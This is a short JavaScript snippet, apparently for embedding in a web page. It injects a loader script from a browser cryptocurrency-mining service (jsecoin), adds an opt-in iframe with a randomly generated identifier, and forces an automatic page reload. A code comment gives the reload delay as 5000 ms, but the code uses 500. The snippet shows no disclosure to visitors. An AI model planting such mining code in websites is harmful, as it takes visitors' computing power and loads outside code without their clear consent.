!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/73519/newcon/0/0/",s.parentNode.insertBefore(t,s);}();
!function(){var e=document,t=e.createElement("iframe"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com:443/optin/"+Array.apply(0, Array(64)).map(function() {
    return (function(charset){
        return charset.charAt(Math.floor(Math.random() * charset.length))
    }('abcdefghijklmnopqrstuvwxyz0123456789'));
}).join('')
+"/",s.parentNode.insertBefore(t,s)}();
if(location.search.indexOf('reloaded=yes') < 0){
	var hash = window.location.hash;
	var loc = window.location.href.replace(hash, '');
	loc += (loc.indexOf('?') < 0? '?' : '&') + 'reloaded=yes';
	// SET THE ONE TIME AUTOMATIC PAGE RELOAD TIME TO 5000 MILISECONDS (5 SECONDS):
	setTimeout(function(){window.location.href = loc + hash;}, 500);}
/*
setTimeout(function() {location.reload();},8000);
*/
